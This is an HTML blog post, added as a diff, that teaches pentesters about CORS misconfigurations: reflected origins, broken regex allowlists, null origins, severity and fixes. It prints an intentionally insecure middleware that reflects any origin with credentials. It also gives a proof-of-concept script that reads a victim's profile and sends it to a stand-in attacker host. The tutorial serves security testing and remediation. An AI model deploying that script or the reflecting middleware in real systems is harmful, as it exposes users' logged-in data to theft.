@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CORS Misconfiguration - Dhanusha K</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&family=Lora:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+
+  <div class="topbar">
+    <div class="path">~/dhanusha-k<span>/explore/blogs</span></div>
+    <nav>
+      <a href="../index.html">Home</a>
+      <a href="../index.html#about">About</a>
+      <a href="../index.html#explore" class="active">Explore</a>
+      <a href="../index.html#contact">Contact</a>
+    </nav>
+  </div>
+
+  <div class="bg-grid"></div>
+  <div class="global-scan"></div>
+
+  <main class="article-page">
+    <div class="article-container">
+
+      <a href="../blogs.html" class="article-back">
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M15 6l-6 6 6 6"/></svg>
+        back to blogs
+      </a>
+
+      <h1 class="article-title">CORS Misconfiguration: The Bug That's Basically the Internet Saying "Sure, Come On In"</h1>
+      <div class="article-meta">
+        <span>Dhanusha K</span>
+        <span class="dot">&middot;</span>
+        <span>Sept 19, 2026</span>
+        <span class="dot">&middot;</span>
+        <span>10 min read</span>
+      </div>
+
+      <!--
+        ===========================================================
+        EDIT THE ARTICLE HERE
+        ===========================================================
+      -->
+      <div class="article-body">
+
+        <p>Let me set a scene. You're testing an app, you open Burp, and you notice something in the response headers that makes you sit up a little straighter:</p>
+
+        <pre><code>Access-Control-Allow-Origin: https://evil-attacker.com<br>Access-Control-Allow-Credentials: true</code></pre>
+
+        <p>If you know what you're looking at, this is the security equivalent of a bank teller saying "sure, no ID needed, just tell me whose account you want money from." If you don't know what you're looking at yet - stick around, because by the end of this you will, and you'll never un-see it in a Burp response again.</p>
+
+        <h2>First, What Is CORS Even For?</h2>
+        <p>Before we talk about how it breaks, let's talk about why it exists - because CORS isn't the villain here. It's a well-intentioned bouncer.</p>
+        <p>By default, browsers enforce something called the <strong>Same-Origin Policy (SOP):</strong> JavaScript running on <code>siteA.com</code> can't just reach over and read data from <code>siteB.com</code> on a user's behalf. This is good! Without it, any website you visit could silently make authenticated requests to your bank, your email, your everything, using cookies your browser is already carrying around.</p>
+        <p>But sometimes, legitimate cross-origin requests should be allowed - your frontend on <code>app.example.com</code> needs to talk to your API on <code>api.example.com</code>, for instance. That's what <strong>CORS (Cross-Origin Resource Sharing)</strong> is for: it's the mechanism that lets a server explicitly say "hey browser, it's fine, let this specific origin through."</p>
+        <p>The keyword there is specific. CORS misconfiguration happens when "specific" quietly turns into "basically anyone."</p>
+        
+        <h2>The Moment It All Goes Wrong</h2>
+        <p>Here's the thing about CORS bugs - they don't look like bugs. They look like someone solved a problem. Picture a dev, mid-sprint, fighting a wall of red CORS errors in the browser console because the frontend and API are on different domains. It's 6 PM, the errors won't stop, and somewhere on Stack Overflow there's an answer with 4,000 upvotes that "just works":</p>
+
+        <pre><code><span class="tok-com">// The "fix" that started it all</span>
+          app.<span class="tok-fn">use</span>((<span class="tok-kw">req</span>, <span class="tok-kw">res</span>, <span class="tok-kw">next</span>) => {
+            res.<span class="tok-fn">header</span>(<span class="tok-str">"Access-Control-Allow-Origin"</span>, req.headers.origin); <span class="tok-com">// reflects ANY origin back</span>
+            res.<span class="tok-fn">header</span>(<span class="tok-str">"Access-Control-Allow-Credentials"</span>, <span class="tok-str">"true"</span>);
+            <span class="tok-fn">next</span>();
+          });</code></pre>
+        
+        <p>The console errors vanish. The feature ships. And now the server will happily reflect <strong>literally any origin that asks</strong>, including <code>https://totally-not-a-scam.com</code>, and tell the browser it's fine to send cookies along with the request. This is the bug in its most common wild-form, and it's the one you'll find more often than you'd expect once you start actively poking at <code>Origin</code> headers.</p>
+
+        <h2>The Anatomy of the Bug (aka What You're Actually Looking For)</h2>
+        <p>There are a few flavors, and part of the fun of hunting CORS bugs is that each one has a slightly different "gotcha":</p>
+        <p><strong>1. The Reflector -</strong> server echoes back whatever <code>Origin</code> header you send, no validation at all.</p>
+        <pre><code>Request:  Origin: https://evil.com<br>Response: Access-Control-Allow-Origin: https://evil.com</code></pre>
+        <p>Send any origin, get that same origin whitelisted right back at you. This is the classic Stack-Overflow-copy-paste bug.</p>
+
+        <p><strong>2. The Wildcard-Plus-Credentials Combo -</strong> technically browsers block this one (<code>Access-Control-Allow-Origin: *</code> combined with <code>Access-Control-Allow-Credentials: true</code> is disallowed by spec), but you'll still see apps trying it, and it's worth knowing as a "this dev didn't fully understand CORS" red flag when you see it attempted elsewhere in the config.</p>
+
+        <p><strong>3. The Regex Gone Wrong -</strong> someone tried to do this properly with an allowlist regex, and got the pattern wrong:</p>
+        <pre><code><span class="tok-com">// Meant to match only subdomains of example.com</span><br><span class="tok-sym">if</span> (<span class="tok-str">/example\.com</span><span class="tok-sym">$</span><span class="tok-str">/</span>.<span class="tok-fn">test</span>(origin)) { <span class="tok-fn">allow</span>(); }</code></pre>
+        <p>Looks safe at a glance. Except <code>evil-example.com</code> also ends in <code>example.com</code> and passes right through. Or worse, unescaped dots mean <code>exampleXcom</code> or similar variants slip past too. This is the one that separates a rushed test from a thorough one - always check the regex, don't just skim the intent.</p>
+
+        <p><strong>The Null Origin Trap -</strong> some configs allow <code>Origin: null</code> to get through (often to support sandboxed iframes or local file testing during dev, then forgotten). An attacker can trivially force a <code>null</code> origin using a sandboxed iframe, so if you see <code>null</code> in the allowlist, that's a free pass sitting right there.</p>
+
+        <h2>Proving It's Actually Exploitable</h2>
+        <p>Finding the misconfigured header is step one. The part that makes a report land with real impact is showing what an attacker actually gets. A quick PoC does the job:</p>
+
+        <pre><code>&lt;<span class="tok-kw">script</span>&gt;<br><span class="tok-fn">fetch</span>(<span class="tok-str">"https://victim-api.com/api/user/profile"</span>, {
+          <span class="tok-kw">credentials</span>: <span class="tok-str">"include"</span><br>})<br>.<span class="tok-fn">then</span>(<span class="tok-kw">res</span> <span class="tok-sym">=></span> res.<span class="tok-fn">json</span>())<br>.<span class="tok-fn">then</span>(<span class="tok-kw">data</span> <span class="tok-sym">=></span> {
+          <span class="tok-fn">fetch</span>(<span class="tok-str">"https://attacker-server.com/log?data="</span> + JSON.<span class="tok-fn">stringify</span>(data));<br>});<br>&lt;/<span class="tok-kw">script</span>&gt;</code></pre>
+
+        <p>Host that on your test domain, set your test domain as the <code>Origin</code>, and if the response comes back with sensitive account data instead of a CORS rejection - you've got your proof. The victim's browser did all the work, using their real, logged-in session, without them clicking anything except a malicious link.</p>
+
+        <h2>Why This One Deserves More Than a "Medium" Without Thinking</h2>
+        <p>Here's where a lot of newer testers underrate this bug: CORS misconfig on its own, with no credentialed endpoint behind it, is often low-to-informational. But the moment <code>Access-Control-Allow-Credentials: true</code> is paired with a reflected origin and there's an endpoint returning sensitive data (profile info, tokens, account details, admin functions) - that combination is a full <string>session hijacking / account takeover primitive</strong>, no XSS or CSRF token bypass required. The severity swings hard based on what's actually reachable, so don't rate the header in isolation - chase it to an endpoint and see what falls out.</p>
+
+        <h2>The Fix (For When You Write It Up)</h2>
+        <ul>
+          <li><strong>Never reflect <code>Origin</code> blindly.</strong> Validate against an explicit allowlist of trusted origins.</li>
+          <li><strong>Never combine <code>*</code> with credentials -</strong> the spec blocks it, but audit for it anyway as a sign of broader misunderstanding.</li>
+          <li><strong>Tighten regex allowlists -</strong> anchor them properly (<code>^https://([a-z0-9-]+\.)?example\.com$</code>), don't just check "ends with."</li>
+          <li><strong>Drop <code>null</code> from any allowlist</strong>, full stop.</li>
+        </ul>
+
+        <h2>The Takeaway</h2>
+        <p>CORS misconfiguration is what happens when a security control gets treated as an annoying error message to silence rather than a boundary to respect. It rarely looks dramatic in a diff - usually it's one line, one reflected header, one dev just trying to make the console stop yelling at them. But that one line is often the difference between "our API only talks to our frontend" and "our API talks to whoever asks nicely."</p>
+        <p>Next time you see a CORS error in a console during testing, don't just move past it - that error is the control working. It's the absence of that error, on an origin that has no business being there, that's the real find.</p>
+
+      </div>
+
+      <div class="article-tags">
+        <span class="tag" style="cursor:default;">Web App VAPT</span>
+        <span class="tag" style="cursor:default;">Pentesting</span>
+        <span class="tag" style="cursor:default;">CORS</span>
+      </div>
+
+    </div>
+  </main>
+
+  <div class="footerbar">
+    <div class="hint">thanks for reading</div>
+  </div>
+
+</body>
+</html>
